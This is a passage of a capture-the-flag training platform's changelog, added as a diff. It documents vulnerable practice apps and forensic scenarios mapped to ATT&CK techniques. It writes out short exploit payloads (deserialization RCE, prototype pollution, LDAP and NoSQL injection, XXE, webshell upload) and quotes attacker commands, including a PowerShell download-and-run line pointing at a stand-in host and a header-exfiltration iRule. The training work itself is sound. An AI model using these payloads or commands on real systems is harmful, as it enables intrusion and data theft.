@@ -4707,3 +4707,1024 @@ Out-of-session / operator-side only:
 * **promtool linting in CI** — irrelevant while Actions is off.
 
 Phase 0–12 + Sprints 1–13 in-session work shipped.
+
+## Threat-hunt mini-campaigns (Tier 2) — 14/14 shipped (2026-05-16)
+
+Final tier-2 batch:
+
+* ``tier-2-execution`` (TA0002) — T1059.001/.003, T1053.005, T1106, T1204.002.
+* ``tier-2-privilege-escalation`` (TA0004) — T1548.001/.002, T1055.001, T1134.001, T1078.003.
+* ``tier-2-collection`` (TA0009) — T1005, T1056.001, T1119, T1115, T1074.001.
+* ``tier-2-reconnaissance`` (TA0043) — T1595.002, T1589.002, T1592, T1591.001, T1596.005.
+* ``tier-2-resource-development`` (TA0042) — T1583.001, T1585.001, T1586.001, T1588.002, T1608.001.
+
+Pre-compromise tactics (TA0042/TA0043) use a different corpus shape — WAF /
+passive-DNS / CT-log / WHOIS / impersonation-report — rather than host
+telemetry. ``docs/threat-hunt-coverage.md`` now lists every tier-2 row as
+``✅ shipped``.
+
+## Red exercise pack #1 — 4 new offensive challenges (2026-05-16)
+
+Hand-authored single-image Flask apps, all team=red, served on :5000:
+
+* ``insecure-deserialization`` (d3, 400pt) — DiaryBox remember-me cookie is
+  a base64 ``pickle.loads`` sink. Forge ``__reduce__`` → RCE → ``/flag.txt``.
+  T1190, T1059.006.
+* ``command-injection`` (d2, 300pt) — NetTools wraps ``ping``/``dig`` with a
+  weak metachar blacklist (``;|&`` stripped; ``$()`` and newlines pass).
+  T1190, T1059.004.
+* ``idor-api`` (d2, 300pt) — NotesVault REST API checks auth but not
+  ownership; ``GET /api/users/1001/notes`` leaks admin's flagged note.
+  Maps to OWASP API #1 (BOLA). T1078, T1213.
+* ``ssti-jinja`` (d3, 400pt) — Greetly drops ``?name=`` into a Jinja2
+  template string. ``{{7*7}}`` confirms; MRO walk or ``cycler`` globals
+  give RCE → ``/flag.txt``. T1190, T1059.006.
+
+All four shipped via ``challenges/<slug>/`` and pick up automatically through
+the existing glob-driven ``scripts/seed_challenges.py``. No factory yet for
+red — each one is too distinct to template; if a pattern emerges
+(e.g., "weak-blacklist class") it can be extracted later.
+
+## Red exercise pack #2 — 4 more offensive challenges (2026-05-16)
+
+Different stacks, different bug classes, no overlap with pack #1:
+
+* ``xxe-xml-bomb`` (d3, 400pt) — Python/Flask + lxml. InvoiceLab parses
+  XML with ``resolve_entities=True`` / ``load_dtd=True``. ``<!ENTITY xxe
+  SYSTEM "file:///flag.txt">`` → vendor field echoes the file.
+  T1190, T1005.
+* ``php-type-juggling`` (d2, 300pt) — PHP 8.2 + Apache. VaultPin compares
+  ``md5($pin) == $stored`` where the stored hash is the magic
+  ``0e462097...`` (md5 of ``240610708``). Any other ``0e[digits]`` magic
+  hash (``QNKCDZO``, ``aabg7XSs``) collides via loose float coercion.
+  T1190, T1078.
+* ``race-condition`` (d3, 400pt) — Python/Flask threaded. CouponStore's
+  ``/redeem`` reads ``coupon.used``, sleeps 250 ms, then increments. Fire
+  ~12 concurrent requests with the same session cookie, balance climbs
+  to ≥ 1000 credits, ``/buy-flag`` returns the flag. Classic TOCTOU.
+  T1190, T1078.
+* ``file-upload-rce`` (d2, 350pt) — PHP 8.2 + Apache with ``AddType``
+  registering ``.phtml`` / ``.phar``. PicProfile's blacklist only knows
+  about ``.php`` / ``.php5`` / ``.php7`` / ``.pht``. Upload
+  ``shell.phtml``, hit ``/uploads/shell.phtml?c=cat /flag.txt``.
+  T1190, T1505.003.
+
+Cumulative red roster after pack #2: 13 challenges spanning SQLi, XSS,
+SSRF, JWT, weak-crypto, SUID privesc, deserialization, command injection,
+IDOR, SSTI, XXE, PHP type juggling, race condition, file upload —
+covering OWASP Top 10 plus several OWASP API Top 10 entries.
+
+## Red exercise pack #3 — 4 more offensive challenges (2026-05-16)
+
+Wider language and bug-class spread; pack #3 introduces Node and GraphQL
+to the roster and adds traversal + second-order injection to the
+distinct-vuln list:
+
+* ``prototype-pollution`` (d3, 400pt) — Node 20 + Express. PrefsHub does
+  a naive recursive deep-merge of the request body into a session prefs
+  object. POST ``{"__proto__":{"isAdmin":true}}`` mutates
+  ``Object.prototype``; ``/admin`` then resolves ``session.isAdmin`` via
+  the prototype chain. T1190, T1078.
+* ``graphql-introspection`` (d2, 300pt) — Flask + Graphene. BlogQL leaves
+  introspection on and declares an "internal" ``secretAuditEntry`` field
+  that's resolver-gated by nothing but obscurity. Player runs
+  ``__schema`` query → finds field → calls it. T1190, T1213.
+* ``second-order-sqli`` (d3, 400pt) — Flask + sqlite. AccountVault
+  parameterises ``INSERT`` (safe) but interpolates the stored username
+  into the ``UPDATE`` issued by ``/change-password`` (unsafe). Registering
+  with username ``admin'--`` lets the player rewrite admin's password,
+  log in as admin, fetch the flag. T1190, T1078.
+* ``path-traversal`` (d2, 300pt) — Flask. DocsViewer "sanitises" the
+  ``?file=`` arg with a single-pass ``replace('../','')``; the bypass
+  ``....//`` collapses to ``../`` after one pass. Three stacked layers
+  escape from ``/var/www/docs/`` to ``/flag.txt``. T1190, T1005.
+
+Verified mechanically: prototype-pollution attack walks Object.keys()
+into target.__proto__ (Object.prototype) under JSON.parse semantics that
+keep ``__proto__`` as an own property; second-order SQLi UPDATE
+collapses correctly through sqlite's ``--`` comment handling;
+``....//....//....//flag.txt`` collapses to ``../../../flag.txt``
+under Python ``str.replace`` exactly once (verified).
+
+Cumulative red roster after pack #3: 18 challenges. Stacks now
+covered: Python/Flask, PHP/Apache, Node/Express. Distinct bug classes:
+SQLi (1st and 2nd order), XSS, SSRF, JWT, weak crypto, SUID privesc,
+command injection, IDOR/BOLA, SSTI, deserialization, XXE, PHP type
+juggling, race condition, file-upload RCE, prototype pollution,
+GraphQL introspection, path traversal.
+
+## Red exercise pack #4 — 4 more offensive challenges (2026-05-16)
+
+Pack #4 fills the auth-bypass and protocol-injection gaps:
+
+* ``crlf-injection`` (d3, 400pt) — Python ``http.server`` (raw socket
+  writes, no header validation). RedirectorCo's ``/redirect`` splices
+  ``?to=`` into the ``Location:`` header. Smuggle ``%0d%0a%0d%0aHTTP/1.1
+  200 OK%0d%0a...`` and the handler's self-detector finds a second
+  status line in its output buffer and appends the flag. T1190.
+* ``jwt-key-confusion`` (d4, 500pt) — Flask + cryptography (no PyJWT —
+  modern PyJWT refuses this pattern out of the box, so we hand-rolled
+  the verifier). TokenStop accepts both ``RS256`` and ``HS256`` with the
+  same ``key`` parameter; on the HS256 path the PEM public key bytes are
+  the HMAC secret. ``/public-key`` serves the PEM. Forge an admin token.
+  T1190, T1078.
+* ``ldap-injection`` (d3, 400pt) — Flask + hand-rolled LDAP filter
+  parser (AND/OR/NOT, wildcards). DirCorp builds
+  ``(&(uid={USER})(password={PASS}))`` by string interpolation. Payload
+  ``username=*)(uid=admin``, ``password=*`` yields
+  ``(&(uid=*)(uid=admin)(password=*))`` — admin matches with no real
+  password. T1190, T1078.
+* ``nosql-injection`` (d2, 350pt) — Flask + hand-rolled Mongo-style
+  query semantics ($ne / $gt / $regex / $in / $exists). DocVault passes
+  the JSON body straight into the filter dict. Body
+  ``{"username":"admin","password":{"$ne":null}}`` bypasses the password
+  check. T1190, T1078.
+
+Verified mechanically: LDAP bypass yields admin in DIRECTORY ✓; NoSQL
+$ne bypass and $ne-on-both-fields bypass both return admin first ✓;
+CRLF split self-detected via ``\\r\\nHTTP/1.x NNN`` regex; JWT
+algorithm-confusion uses literal PEM bytes (with newlines and BEGIN/END
+markers) as HMAC secret in both signing and verification paths.
+
+Cumulative red roster after pack #4: **22 challenges**. New bug classes
+this pack: CRLF response splitting, JWT algorithm confusion (distinct
+from existing ``jwt-forgery`` ``alg=none``), LDAP injection, NoSQL
+injection. Cumulative total catalogue: **28 challenges (6 blue, 22
+red)**.
+
+## UI refactor — challenge nav + management at 28+ challenges (2026-05-16)
+
+The Challenges page exposed only team / search / sort; the catalogue
+grew past where that breaks down. Player and admin UIs widened in
+parallel without changing routes or shapes:
+
+**Player Challenges page (``frontend/src/pages/Challenges.jsx``):**
+
+* Status chip group (All / Unsolved / Solved). Filter is client-side
+  over the existing ``user_solved`` field on list items.
+* Category chip row — auto-derived from the loaded result set so it
+  self-updates as new categories ship.
+* Difficulty 1-5 chip row.
+* Results count (``N of M shown``) and a one-click "clear filters"
+  button that resets the store and the local search input.
+* Empty-state card for "no challenges match the current filters".
+
+**Player Challenges store (``frontend/src/stores/challengeStore.js``):**
+
+* Bumped ``per_page`` from 20 to 50 (backend caps at 100). One fetch
+  covers the whole catalogue at current size; pagination UI stays a
+  future-only concern.
+* Added ``status: 'all'|'solved'|'unsolved'`` to the filter dict and
+  ``clearFilters()``.
+
+**Admin Challenges tab (``frontend/src/pages/Admin.jsx``):**
+
+* Search box (title / slug / category, client-side).
+* Team filter (all / red / blue) and release filter (all / live /
+  draft) as chip groups.
+* "Release all N drafts" bulk action — confirms via ``window.confirm``,
+  iterates ``/api/v1/admin/challenges/{slug}/release`` per draft,
+  toasts the success/fail counts. Useful right after a seed when
+  every new ``challenge.json`` lands in ``draft``.
+* Visible/total counter on the toolbar.
+
+Selectors added to back future Playwright coverage:
+``filter-team-*``, ``filter-status-*``, ``filter-categories``,
+``filter-difficulties``, ``results-count``, ``clear-filters``,
+``challenge-search``, ``admin-team-*``, ``admin-release-*``,
+``challenge-bulk-release``. Existing ``challenge-new`` selector
+preserved.
+
+esbuild ``--loader:.jsx=jsx`` parses all three files clean. Existing
+e2e specs reference none of the new selectors — additions are
+non-breaking.
+
+## Network Device Forensics pack — 3 vendor scenarios (2026-05-16)
+
+New blue-team track. Reuses the threat-hunt factory runtime
+(SSH-into-container, ``~/logs/``, ``answer`` CLI, loopback validator)
+since the structure — staged corpus, 5 questions, normalised
+answers — applies cleanly. Each YAML lives under
+``challenges/_factory/campaigns/device-*.yaml``; ``generate.py`` was
+unchanged.
+
+* ``device-cisco-ios`` (d3, 450pt) — Cisco 2911 ISR, IOS 15.7.
+  Rogue ``privilege 15`` local user not on the approved roster, SNMP
+  ``RW`` community ``REDACTED``, unauthorised ``Tunnel0`` GRE to
+  REDACTED, outbound ACL 102 modified to permit the C2 /24,
+  attacker SSH session from REDACTED. Corpus: running-config,
+  show snmp / show users, syslog, approved-users roster.
+  T1078, T1078.001, T1133, T1562.004, T1021.004.
+
+* ``device-fortigate-cve`` (d4, 500pt) — FortiGate 100F, FortiOS 7.2.4.
+  CVE-2022-40684-style Forwarded-header auth bypass
+  (``Forwarded: for=REDACTED``) used to ``POST
+  /api/v2/cmdb/system/admin`` and add a super_admin
+  ``REDACTED`` with no trusthost restriction; SSL-VPN portal
+  ``full-access`` split-tunnel routing was then extended to expose
+  ``REDACTED``. Corpus: HTTPS admin access log, system event log,
+  unified config diff, approved-admins roster.
+  T1190, T1078.003, T1556, T1098, T1078.
+
+* ``device-paloalto-vpn`` (d3, 450pt) — PA-3220, PAN-OS 10.2.
+  Auth-profile ``REDACTED`` shipped a temporary fix for a
+  contractor onboarding bug that removed the ``<multi-factor-auth>``
+  block and never reinstated it. Attacker brute-forced
+  ``REDACTED`` from REDACTED (237 failures, then
+  success), then crossed an over-permissive
+  ``REDACTED`` rule to RDP into the management subnet
+  at REDACTED. Corpus: PAN-OS XML config excerpt, GlobalProtect
+  portal log, traffic log, system log.
+  T1556.006, T1110, T1078, T1021.001, T1190.
+
+Coverage doc (``docs/threat-hunt-coverage.md``) gained a new
+"Network Device Forensics" section listing the three shipped vendors
+plus a ⏳-planned list for Juniper Junos, MikroTik RouterOS, and
+Aruba ClearPass — the obvious next batch when this pack returns.
+
+Cumulative blue roster after this pack: **9 challenges** (was 6 — added
+3 device-forensics). Cumulative catalogue: **31 challenges (9 blue, 22
+red)**, in addition to the 15 tier-1+tier-2 threat-hunt scenarios.
+
+## Live-CLI device simulator + first live challenge (2026-05-16)
+
+Added a tier-1 vendor-CLI simulator so device-forensics scenarios can
+be **interactive** rather than static-log-only. No licensed vendor
+images required — purely educational sim, vendor grammar pluggable per
+challenge.
+
+**Engine** (``challenges/device-cisco-ios-live/shell.py``, ~280 lines):
+* Mode stack — user / privileged / config, with prompt-suffix changes
+  (``>`` / ``#`` / ``(config)#``).
+* Prefix matching across a nested command tree — ``sh ip int br``
+  resolves to ``show ip interface brief`` exactly like real IOS;
+  ambiguous prefixes produce ``% Ambiguous command:  "s"``; incomplete
+  ones produce ``% Incomplete command.``; unknowns produce
+  ``% Invalid input detected at '^' marker.``.
+* Universal pipes — ``| include <re>`` / ``| exclude <re>`` /
+  ``| begin <re>`` / ``| section <re>`` / ``| count`` /
+  ``| grep <re>`` (cross-vendor alias). Section honours Cisco's
+  indented-continuation semantics.
+* Cisco-style line auth banner — v1 accepts any non-empty user/pass;
+  the ``enable`` secret is checked against a per-grammar password.
+
+**IOS grammar + device data** (``ios_device.py``, ~280 lines):
+* Canned ``show`` outputs for running-config, startup-config, users,
+  snmp, logging, version, ip route, ip interface brief, access-lists,
+  history.
+* ``enable`` (password ``n0c-l3v3l-15``), ``disable``, ``configure
+  terminal``, ``end``, ``exit``/``logout``/``quit``, ``write memory``,
+  ``terminal length/monitor`` no-ops.
+* ``PRELOADED_HISTORY`` is the **attacker's command trail** left in
+  the per-line history buffer. Player runs ``show history`` after
+  ``enable`` and reads the exact sequence of malicious changes — an
+  extra forensics tell the static-logs version can't offer.
+
+**Challenge wiring** (``challenges/device-cisco-ios-live/``):
+* SSH-into-container on :2222 (hunter/hunter), bash dropping. Player
+  runs ``connect br-edge-01`` to enter the IOS sim.
+* Validator daemon on 127.0.0.1:5000 + factory ``answer`` CLI reused
+  verbatim. Five questions match the static version's answers so the
+  tracks are cross-referenceable; the **flag is different**
+  (``CTF{REDACTED}``) so ride-along solvers still work.
+* Hand-authored (factory not extended) — blast radius is zero against
+  the 28 existing factory-generated challenges.
+
+**Verification** — scripted end-to-end session against ``shell.py``:
+* Q1 ``REDACTED`` reachable via ``show users`` and
+  ``show run | include privilege 15``.
+* Q2 ``REDACTED`` via ``show run | include snmp-server community``.
+* Q3 ``REDACTED`` via ``show run | section interface Tunnel0``.
+* Q4 ``102`` via ``show access-lists``.
+* Q5 ``REDACTED`` via ``show users`` (live session) and
+  ``show logging`` (priv mode).
+* Error parity: ``sh``, ``sh ip`` → "% Incomplete command."; ``foo``
+  → "% Invalid input detected at '^' marker."; wrong enable → "%
+  Access denied".
+
+**Catalogue after this drop**: 32 challenges (10 blue, 22 red); blue
+track now has both static-logs and live-CLI tracks for Cisco. Same
+engine ports to FortiOS / PAN-OS by writing a new
+``<vendor>_device.py`` module — engine is vendor-neutral.
+
+## Live-CLI device sim — FortiOS + PAN-OS (2026-05-16)
+
+Ported the device-shell engine to two more vendors. The engine
+itself gained per-device override hooks (backward-compatible
+defaults preserve Cisco behaviour):
+
+* ``PROMPT_SUFFIXES`` — replaces the hardcoded
+  ``{user:">", priv:"#", config:"(config)#"}`` map per vendor.
+* ``PROMPT_FORMAT(host, mode, suffix) -> str`` — optional
+  callable. PAN-OS uses it to render ``admin@<host>{suffix}``.
+* ``AUTH_BANNER`` / ``AUTH_USERNAME_PROMPT`` /
+  ``AUTH_PASSWORD_PROMPT`` — replace the Cisco-flavoured "User
+  Access Verification" / "Username: " / "Password: " strings.
+  ``{hostname}`` placeholder in the username prompt lets vendors
+  render their classic ``<host> login: `` line.
+
+Both new device modules verified end-to-end against the questions
+in the static counterparts; the engine drift across the three
+challenges is zero (``diff shell.py`` clean between all three).
+
+**``device-fortigate-live``** (d4, 550pt — slightly higher than
+the static variant since the player has to type real FortiOS
+commands, not just grep canned log files):
+
+* Single-mode prompt ``FGT-PERIM-02 # `` (FortiOS pads the # with
+  spaces — verbatim render).
+* ``get system status``, ``show full-configuration``,
+  ``show system admin``, ``show vpn ssl web portal``,
+  ``execute log display``. Synthetic ``show admin-https-log``
+  command exposes the API access log (real FortiOS surfaces this
+  via ``execute backup logs``; we surface it inline for the
+  challenge).
+* Same five answers / different flag (``CTF{REDACTED}``)
+  as the static ``device-fortigate-cve``.
+
+**``device-paloalto-live``** (d3, 500pt):
+
+* Dual-mode — operational ``admin@FW-DC-01> `` and configure
+  ``admin@FW-DC-01# `` — via the new PROMPT_FORMAT hook. Mode
+  transition via ``configure`` / ``exit``; ``commit`` is exposed
+  as a no-op for realism.
+* ``show system info``, ``show config running`` (XML), ``show
+  running security-policy``, ``show log globalprotect``,
+  ``show log traffic``, ``show log system``, ``show admins``,
+  ``show global-protect-gateway current-user``.
+* PAN-OS XML doesn't fit Cisco-style ``| section`` (everything's
+  indented); briefing recommends ``| begin`` and ``| include``.
+* Same five answers / different flag
+  (``CTF{REDACTED}``) as the static
+  ``device-paloalto-vpn``.
+
+Verification — scripted Q1-Q5 against each live shell:
+
+* FortiGate — ``show admin-https-log | include Forwarded`` →
+  ``Forwarded: for=REDACTED`` (Q1); ``show system admin |
+  include REDACTED`` → present (Q2); diff vs
+  ``~/approved-admins.txt`` shows missing ``REDACTED`` (Q3);
+  ``show full-configuration | include 10.250.0.0`` → the
+  ``set subnet`` line (Q4); ``execute log display | include
+  login successful`` → srcip=REDACTED (Q5).
+* Palo Alto — ``show config running | include
+  authentication-profile`` → ``REDACTED`` entry visible
+  (Q1); ``show log globalprotect | include auth-success`` →
+  REDACTED / REDACTED (Q2/Q3); ``show log traffic |
+  include ms-rdp`` → REDACTED (Q4); ``show running
+  security-policy`` → ``REDACTED`` (Q5).
+
+**Catalogue after this drop**: **34 challenges (12 blue, 22 red).**
+Each vendor now has *both* the static-logs track (easy mode —
+read the staged files) and the live-CLI track (real device
+forensics muscle memory). Coverage doc updated.
+
+Engine drift mitigation: ``shell.py`` is currently copy-pasted
+three times. ``diff`` between the three is zero today. When a
+fourth vendor lands, this is the cue to extract to a shared
+location.
+
+## Live-CLI device sim — F5 BIG-IP + Citrix NetScaler (2026-05-16)
+
+Ported the device-shell engine to two perimeter-appliance vendors,
+each with a real, publicly-documented CVE chain as the backdrop:
+
+**``device-f5-bigip-live``** (d4, 550pt) — F5 BIG-IP 14.1.0,
+CVE-2020-5902 lineage (TMUI path-traversal-to-RCE):
+
+* Prompt ``bigip-01(tmos)#`` via the ``PROMPT_SUFFIXES`` hook.
+* TMSH commands — ``show /sys version``, ``show /sys hardware``,
+  ``list /auth user``, ``list /ltm virtual``, ``list /ltm rule``
+  (TCL source), ``list /sys management-route``, ``show /sys log
+  audit``. Synthetic ``show httpd-log`` surfaces the TMUI access
+  log so the path-traversal pattern (``/tmui/login.jsp/..;/tmui/
+  locallb/workspace/REDACTED``) is grep-able.
+* Story: attacker reads /etc/shadow via ``REDACTED`` →
+  creates backdoor admin ``REDACTED`` via ``tmsh create auth
+  user`` → adds iRule ``REDACTED`` that ``catch
+  { exec /bin/logger -n 198.51.100.221 -P 514 }`` to exfil HTTP
+  headers → attaches it to ``REDACTED``.
+* T1190, T1078, T1071.001, T1556, T1021.001.
+
+**``device-citrix-netscaler-live``** (d4, 550pt) — NetScaler
+MPX-15020, NS 13.1, CVE-2023-3519 family:
+
+* Prompt ``NS-PERIM-01> `` via the ``PROMPT_FORMAT`` hook (nscli
+  renders host + space + ``> ``).
+* nscli commands — ``show ns version``, ``show ns hardware``,
+  ``show system user``, ``show vserver``, ``show running config``.
+  Synthetic ``show httpaccess`` and ``show ns log`` surface
+  ``/var/log/httpaccess.log`` and ``/var/log/ns.log`` inline.
+* Story: attacker hits ``REDACTED`` for
+  unauthenticated RCE → drops webshell at
+  ``/var/netscaler/logon/themes/Default/REDACTED`` → uses it
+  to spawn a shell + read /etc/passwd → adds rogue ``REDACTED``
+  system user with superuser binding → stands up LB vserver
+  ``REDACTED`` exposing a DC backend on TCP/22 to the
+  internet.
+* T1190, T1505.003, T1078, T1021.001, T1133.
+
+**Verification** — scripted Q1-Q5 against each:
+
+* F5 — ``show httpd-log | include REDACTED`` → traversal
+  pattern visible (Q1); ``list /auth user | include REDACTED``
+  → present (Q2); ``list /ltm rule | include
+  REDACTED`` + reading the rule body → exfil
+  mechanism (Q3); ``list /ltm virtual`` shows the iRule under
+  ``REDACTED.rules`` (Q4); same access-log entries pin the
+  attacker source IP (Q5).
+* Citrix — ``show httpaccess | include PostMfaResponse`` →
+  POSTs from REDACTED (Q1+Q4); ``show httpaccess | include
+  REDACTED`` → the dropped file (Q2); ``show system user``
+  shows REDACTED with superuser (Q3); ``show vserver`` reveals
+  ``REDACTED TCP 10.10.0.91:22`` (Q5).
+
+**Engine drift mitigation** — F5 was the 4th challenge and Citrix
+the 5th; ``diff`` confirms ``shell.py`` is still byte-identical
+across all five (cisco / fortigate / paloalto / f5 / citrix). The
+extraction cue I noted last drop has not yet been triggered; the
+hooks (``PROMPT_SUFFIXES`` / ``PROMPT_FORMAT`` / ``AUTH_*``) have
+absorbed every vendor difference so far. F5 needed only the
+prompt suffix; Citrix needed only the prompt format. Both fit
+without further engine extensions.
+
+**Catalogue after this drop**: **36 challenges (14 blue, 22 red).**
+Device-forensics track now covers Cisco IOS, FortiOS, PAN-OS, F5
+BIG-IP, and Citrix NetScaler — five vendors. Cisco / FortiOS /
+PAN-OS have both static-logs and live-CLI tracks; F5 and Citrix
+live-CLI only (their static-logs counterparts could be backfilled
+if useful — likely lower priority than expanding to more vendors).
+
+Coverage doc (``docs/threat-hunt-coverage.md``) lists both new
+live entries and adds Cisco ASA / AnyConnect to the planned-next
+slot alongside Juniper / MikroTik / Aruba.
+
+## Live-CLI device sim — five more vendors (2026-05-17)
+
+Five-vendor batch on the same engine. The engine got one
+incremental extension (``| match`` alias + ``| display``
+pass-through pipe operator for Junos) and the new operator is now
+available everywhere — synced byte-identical across all 10
+live-CLI challenge directories. Drift check: zero.
+
+* **``device-cisco-iosxe-live``** (d4, 550pt) — Catalyst 8500,
+  IOS XE 17.9.1a. **CVE-2023-20198** chain: WebUI auth bypass
+  POSTs against ``REDACTED``, rogue
+  privilege-15 user ``REDACTED``, Lua implant served by
+  on-box nginx on TCP/REDACTED as process ``REDACTED``. Player
+  sees ``show users``, ``show webui-log``, ``show running-config |
+  include privilege 15``, ``show ip http server status``, ``show
+  platform software process list``. T1078, T1190, T1505.003.
+
+* **``device-cisco-asa-live``** (d3, 500pt) — ASA 5516, 9.16(3)19.
+  Contractor tunnel-group ``REDACTED`` ships ``anyconnect mfa
+  disable`` and points at ``REDACTED`` auth. Attacker brute-forces
+  ``REDACTED`` from REDACTED, lands a VPN session,
+  pivots RDP to REDACTED. ``show vpn-sessiondb anyconnect``,
+  ``show tunnel-group-info``, ``show running-config``, ``show
+  logging``. T1556.006, T1078, T1110, T1021.001.
+
+* **``device-juniper-junos-live``** (d3, 500pt) — SRX 340, Junos
+  21.2R3-S2.5. Operational/configure dual-mode prompt
+  ``admin@srx-perim-01> `` / ``admin@srx-perim-01# `` with the
+  ``[edit]`` line; ``PROMPT_FORMAT`` hook handles the layout.
+  Stolen ``netops`` creds drove commit sequence 7 that added
+  super-user ``REDACTED``, address-book entry ``attacker-c2 =
+  REDACTED``, and widened ``REDACTED`` to
+  match it. ``show configuration | display set``, ``show system
+  commit``, ``show security policies``, ``show log messages |
+  match REDACTED``. Engine gained ``| match`` (alias for
+  ``include``) and ``| display`` (no-op) to make Junos muscle
+  memory work. T1078, T1556, T1562.004, T1071.001.
+
+* **``device-mikrotik-routeros-live``** (d3, 500pt) — RB750Gr3,
+  RouterOS 7.10.1. Prompt ``[admin@mkt-rb750] > ``. Slash-prefixed
+  command tree (``/system scheduler print``, ``/system script
+  print``, ``/ip firewall nat print``, ``/log print``) — the
+  engine's leading-slash key handling already worked from F5;
+  no engine change needed. CVE-2018-14847 Winbox-bypass-style
+  story: attacker recovers creds, adds local ``REDACTED`` admin,
+  drops scheduler ``REDACTED`` that ``/tool fetch``-es
+  ``http://REDACTED/cmd`` hourly and
+  imports the response (VPNFilter-style persistence pattern),
+  plus a dst-nat ``REDACTED`` exposing
+  REDACTED:22 on WAN:REDACTED. T1053, T1078, T1071.001, T1133,
+  T1021.004.
+
+* **``device-pfsense-live``** (d2, 450pt) — pfSense 2.7.0-RELEASE.
+  WAN-exposed WebGUI brute-forced from REDACTED (200+
+  failures into one success), rogue ``REDACTED`` admin added
+  via ``system_usermanager.php``, ``REDACTED`` NAT rule mapping
+  WAN:REDACTED → REDACTED:22. ``show users``, ``show config``
+  (full ``/conf/config.xml``), ``show nat``, ``show auth-log``,
+  ``show log filter`` / ``show log system``. T1078, T1110, T1133,
+  T1021.004.
+
+**Engine drift status**: still zero. The new
+``| match`` / ``| display`` pipe operators are the only engine
+change since the last drop and are now available to every
+challenge. Five vendors, three CLI families (Cisco-style mode
+stack, single-mode prompts à la FortiOS / MikroTik / pfSense,
+dual-mode op/configure à la PAN-OS / Junos) — all absorbed via
+the same ``PROMPT_SUFFIXES`` / ``PROMPT_FORMAT`` / ``AUTH_*``
+hooks introduced for PAN-OS.
+
+**Catalogue after this drop**: **41 challenges (19 blue, 22 red)**.
+Device-forensics live-CLI track now covers 10 vendor scenarios —
+Cisco IOS / Cisco IOS XE / Cisco ASA / FortiOS / PAN-OS / Juniper
+Junos / MikroTik RouterOS / F5 BIG-IP / Citrix NetScaler /
+pfSense. Coverage doc updated.
+
+## Windows / Active Directory forensics — live-PowerShell track (2026-05-17)
+
+New blue-team track on the same engine. Same SSH-into-container +
+``connect <host>`` pattern; the device-shell engine now renders
+PowerShell-style prompts and runs PowerShell cmdlets as the
+grammar's top-level keys.
+
+**Engine extension this batch**:
+* **Case-insensitive command matching**. Token lookups lowercase
+  both sides during prefix match; pipe operators too. Real Cisco
+  IOS, FortiOS, PAN-OS, Junos, and PowerShell are all
+  case-insensitive — the lowercase vendor-key invariant in every
+  existing grammar makes this trivially safe. ``Get-ADUser`` and
+  ``get-aduser`` resolve identically; ``| INCLUDE`` works
+  alongside ``| include``.
+* ``shell.py`` confirmed byte-identical across all 13 live
+  challenge directories (10 network device + 3 Windows).
+
+**``windows-dc-live``** (d4, 600pt) — DC01.corp.local, Windows
+Server 2022, AD DS forest root:
+* Story — Kerberoasted ``REDACTED`` (SPN
+  ``REDACTED``) from workstation
+  REDACTED (4769s in REDACTED log), used cracked TGS for
+  network-logon as REDACTED (4624 t3), then DCSync (REDACTED +
+  DS-Replication-Get-Changes GUID
+  ``1131f6aa-9c07-11d1-f79f-00c04fc2dcd2``) → added
+  ``REDACTED-temp`` to REDACTED → added an ACE on
+  AdminSDHolder granting that user WriteDACL/WriteOwner so
+  SDProp propagates super-rights every hour.
+* Cmdlets — ``Get-ADUser -Filter * -Properties
+  ServicePrincipalName``, ``Get-ADGroupMember "REDACTED"``,
+  ``Get-ADComputer``, ``Get-ADObject -SearchBase AdminSDHolder``,
+  ``Get-WinEvent -LogName REDACTED``, ``Get-LocalUser``,
+  ``whoami /priv``.
+* T1558.003, T1078, T1003.006, T1098.
+
+**``windows-endpoint-live``** (d3, 550pt) — WS-FIN-04, Windows 11
+Enterprise finance workstation:
+* Story — phishing → ``REDACTED`` macro spawns
+  PowerShell ``-EncodedCommand`` (UTF-8 base64 decodes to
+  ``IEX (New-Object Net.WebClient).DownloadString('http://
+  stage2.malware-cdn.example/payload.ps1')``) → downloads payload
+  → drops ``C:\\ProgramData\\Intel\\Logs\\update.exe`` →
+  registers ``REDACTED`` scheduled task as SYSTEM every
+  10 minutes → beacons to REDACTED:443.
+* Cmdlets — ``Get-WinEvent`` (Sysmon view), ``Get-ScheduledTask``
+  (with ``-TaskName <name>`` for detail), ``Get-Process``,
+  ``Get-NetTCPConnection``, ``Get-ChildItem`` / ``dir`` / ``ls``.
+* T1204.002, T1059.001, T1053.005, T1071.001, T1547.
+
+**``windows-fileserver-live``** (d4, 600pt) — FS-CORP-01, Windows
+Server 2022 SMB file server:
+* Story — pivot from the workstation via stolen ``REDACTED`` creds
+  (4624 t3 from REDACTED with SeBackup/SeRestore/SeTakeOwnership
+  privs) → ``REDACTED delete shadows /all /quiet`` +
+  ``REDACTED shadowcopy delete`` (T1490 inhibit recovery) →
+  ``REDACTED`` service installed (4697) pointing at
+  ``C:\\Staging\\maint.exe`` → ``maint.exe`` started as SYSTEM →
+  first-pass extension rename to ``.l0ck0kk3d`` begins.
+* Cmdlets — ``Get-WinEvent`` (REDACTED or Sysmon),
+  ``Get-CimInstance Win32_ShadowCopy``, ``Get-SmbSession``,
+  ``Get-Service``, ``Get-ChildItem C:\\Staging`` /
+  ``C:\\Shares\\Finance``.
+* T1021.002, T1078, T1490, T1543.003, T1074.001.
+
+**Verification** — scripted Q1-Q5 against each shell:
+
+* DC — Kerberoast SPN, rogue Domain-Admins member, source IP,
+  DCSync event ID REDACTED all reachable through real cmdlet chains.
+* Endpoint — macro filename in WINWORD's Sysmon EventID 1,
+  encoded PowerShell URL in the next EventID 1 (decodes cleanly
+  with ``printf '<blob>' | base64 -d``), persistence task in
+  ``Get-ScheduledTask | include Intel``, C2 IP in
+  ``Get-NetTCPConnection | include Established`` cross-referenced
+  with ``Get-Process`` for the owning PID.
+* File server — 4624 (logon) + 4688 (vssadmin) + 4697 (service
+  installed) chain visible end-to-end; ``Get-CimInstance
+  Win32_ShadowCopy`` confirms empty result post-delete; staging
+  dir contents match the FileCreate Sysmon entries.
+
+**Catalogue after this drop**: **44 challenges (22 blue, 22 red)** —
+blue and red now at parity. Device-forensics live-CLI track covers
+**13 scenarios** — 10 network device vendors + 3 Windows / AD
+hosts.
+
+## Exchange + IIS + Linux live-shell scenarios (2026-05-17)
+
+Three more live-shell scenarios on the same engine — two Windows
+application servers and the first Linux host. **Zero engine
+changes**; the case-insensitive matching + per-device hooks added
+in earlier drops absorbed both.
+
+**``windows-exchange-live``** (d4, 650pt) — EXCH-01.corp.local,
+Exchange Server 2019 CU12 (build 15.2.1118.7 — unpatched
